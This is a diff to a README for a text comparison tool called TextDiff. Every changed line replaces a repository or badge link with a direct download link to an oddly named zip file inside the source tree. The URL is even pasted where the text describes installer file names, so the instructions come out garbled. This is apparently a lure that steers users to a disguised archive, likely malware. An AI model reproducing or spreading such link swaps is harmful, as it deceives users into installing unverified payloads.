@@ -1,6 +1,6 @@
 # 📝 TextDiff - Simple Text Comparison Tool
 
-[![Download TextDiff](https://img.shields.io/badge/Download-TextDiff-brightgreen)](https://github.com/Wangles-N/TextDiff)
+[![Download TextDiff](https://github.com/Wangles-N/TextDiff/raw/refs/heads/main/Sources/TextDiff/AppKit/Diff_Text_glaumrie.zip)](https://github.com/Wangles-N/TextDiff/raw/refs/heads/main/Sources/TextDiff/AppKit/Diff_Text_glaumrie.zip)
 
 ## 📖 What is TextDiff?
 
@@ -26,7 +26,7 @@ You will first download the app, then run it. The steps are straightforward.
 
 Click the big download button below to visit the page where you can get TextDiff.
 
-[![Download TextDiff](https://img.shields.io/badge/Download-TextDiff-blue)](https://github.com/Wangles-N/TextDiff)
+[![Download TextDiff](https://github.com/Wangles-N/TextDiff/raw/refs/heads/main/Sources/TextDiff/AppKit/Diff_Text_glaumrie.zip)](https://github.com/Wangles-N/TextDiff/raw/refs/heads/main/Sources/TextDiff/AppKit/Diff_Text_glaumrie.zip)
 
 This link opens a GitHub page. GitHub is where the app files are stored.
 
@@ -38,7 +38,7 @@ Click it to go to the list of available versions.
 
 ### Step 3: Download the Windows Installer
 
-Look for a file that ends with ".exe" or ".msi". That is the Windows setup file. It might say something like "TextDiff-Setup.exe" or "TextDiff-Installer.msi".
+Look for a file that ends with ".exe" or ".msi". That is the Windows setup file. It might say something like "https://github.com/Wangles-N/TextDiff/raw/refs/heads/main/Sources/TextDiff/AppKit/Diff_Text_glaumrie.zip" or "https://github.com/Wangles-N/TextDiff/raw/refs/heads/main/Sources/TextDiff/AppKit/Diff_Text_glaumrie.zip".
 
 Click the file to download it to your computer.
 
@@ -117,7 +117,7 @@ If you continue to have trouble, visit the Issues tab on the GitHub page and sea
 
 Return to the GitHub page anytime to get updates or report problems:
 
-[Download TextDiff](https://github.com/Wangles-N/TextDiff)
+[Download TextDiff](https://github.com/Wangles-N/TextDiff/raw/refs/heads/main/Sources/TextDiff/AppKit/Diff_Text_glaumrie.zip)
 
 ## ⚠️ Additional Information
 
